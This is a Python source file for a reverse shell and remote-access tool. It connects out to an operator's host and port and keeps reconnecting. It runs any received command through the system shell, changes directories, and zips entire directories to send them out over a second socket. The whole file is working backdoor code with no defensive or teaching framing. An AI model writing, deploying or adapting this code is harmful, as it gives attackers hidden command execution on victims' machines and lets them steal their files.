import socket
import time
import subprocess
import os
import zipfile


ip = "127.0.0.1"
port = 8081


def connection(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"\n[!] Connection received.\n")
            return s
        except socket.error as e:
            print("Connection error:", e)
            time.sleep(10)

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if not data:
                print("[!] Connection closed by the client.")
                break
            if data[:-1].decode() == "/exit":
                s.close()
                break
            else:
                cmd(s, data[:-1].decode())
    except Exception as e:
        print("Error in listen:", e)


def cmd(s, data):
    try:
        if data.startswith("help"):
            help_text = """\n##########

Manual:
-[execute] - to execute commands with a message returned for you;
-[cd] - to change directory;
-[ls or dir] - to list files;
-[ipconfig or ifconfig] - to see IP addresses.
-[Download] - Download mode for files from the server(make shure you are using the client.py file to connect on 8887 port);
-[Upload] - to upload files from your computer(make shure you are using the server.py listening on 8889 port and the same address).

##########\n\n"""
            send_data(s, help_text)

        elif data.startswith("execute"):
            command = data.split(" ", 1)[1]
            output = subprocess.run(command, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)

        elif data.startswith("cd"):
            directory = data.split(" ", 1)[1]
            os.chdir(directory)
            send_data(s, "[+] Directory changed successfully.\n")

        elif data.startswith("Download"):
            server(s)

        elif data.startswith("Upload"):

            s.send(b"Enter the directory to zip> ")
            directory_name = s.recv(1024).decode().strip()
            client_path(s, directory_name)

        else:        
            output = subprocess.run(data, shell=True, capture_output=True, text=True)
            send_data(s, output.stdout)
            if output.stdout:
                send_data(s, output.stdout)
            if output.stderr:
                send_data(s, f"\n[ERROR] Command failed: {output.stderr}\n")

    except Exception as e:
        print("Error in cmd:", e)
        s.send(b"\n[ERROR] Command not recognized on Terminal.\n")


def send_data(s, data):
    s.send(data.encode())

def compactar_diretorio(diretorio, arquivo_saida):
    with zipfile.ZipFile(arquivo_saida, 'w') as zipf:
        for raiz, _, arquivos in os.walk(diretorio):
            for arquivo in arquivos:
                caminho_completo = os.path.join(raiz, arquivo)
                relativo = os.path.relpath(caminho_completo, diretorio)
                zipf.write(caminho_completo, relativo)

def client_path(s, directory_name):
    try:
        if not os.path.isdir(directory_name):
            s.send(b"\n[!] Invalid directory closing client connection.\n")
            return

        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.send(b"\n[!] Trying connection with the server...\n")

        client.connect(('127.0.0.1', 8887))
        print('Connected [!]\n')
        s.send(b"\n[!] Connection Received from the server.\n ")
        time.sleep(2)


        client.send(directory_name.encode())

        with open('received_file.zip', 'wb') as file:
            while True:
                data = client.recv(4096)
                if not data:
                    break
                if data:
                    file.write(data)
                    s.send(b'\n[+] File received as received_file.zip [ok]\n')
                    client.close()
                    s.send(b"\n[-] Client closed\n")

    except ConnectionRefusedError as e:
        print("\nConnection error: ", e)
        exit()
    except Exception as e:
        print("\nConnection error: ", e)
    except KeyboardInterrupt:
        print("\nConnection closed by the client...\n")


def clear_zip():
    zip = "received_file.zip"
    os.path.isfile(zip)
    os.remove(zip)

def server(s):
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        server.bind(('127.0.0.1', 8889))
        server.listen(1)

        s.send(b'\n[!] Waiting for a connection...\n')
        connection, address = server.accept()
        print(f'Connection from {address}')

        s.send(b"\n[!] Connection received! \n")
        diretorio_cliente = connection.recv(1024).decode()

        if not os.path.exists(diretorio_cliente) or not os.path.isdir(diretorio_cliente):
            print(f"Directory '{diretorio_cliente}' does not exist or is not a directory.")
            s.send(b"\n[!] Directory does not exist or is not a directory!\n")
            connection.close()
            server.close()
            s.send(b"\n[-] Server closed\n")
            

        arquivo_zip_saida = 'received_file.zip'

        compactar_diretorio(diretorio_cliente, arquivo_zip_saida)

        if os.path.getsize(arquivo_zip_saida) == 0:
            print(f"\nFailed to create ZIP file for directory '{diretorio_cliente}'.\n")
            s.send(b"\n[!] Failed to create ZIP file for directory.\n")
            connection.close()
            server.close()
            s.send(b"\n[-] Server closed\n")
            exit()

        with open(arquivo_zip_saida, 'rb') as file:
            while True:
                data = file.read(4096)  
                if not data:
                    break
                connection.sendall(data) 

        s.send(b'\n[+] ZIP file sent.\n')
        server.close()
        s.send(b"\n[-] Server closed\n")
        clear_zip()
    except Exception as e:
        print("[ERROR] Failure: ",e)
        s.send(b'[ERROR] Failure on the server.\n')


def main():
    while True:
        try:
            s_connected = connection(ip, port)
            if s_connected:
                listen(s_connected)
            else:
                print("Connection was wrong, trying again.")
        except Exception as e:
            print("Main error: ", e)
            time.sleep(10)


if __name__ == "__main__":
    main()
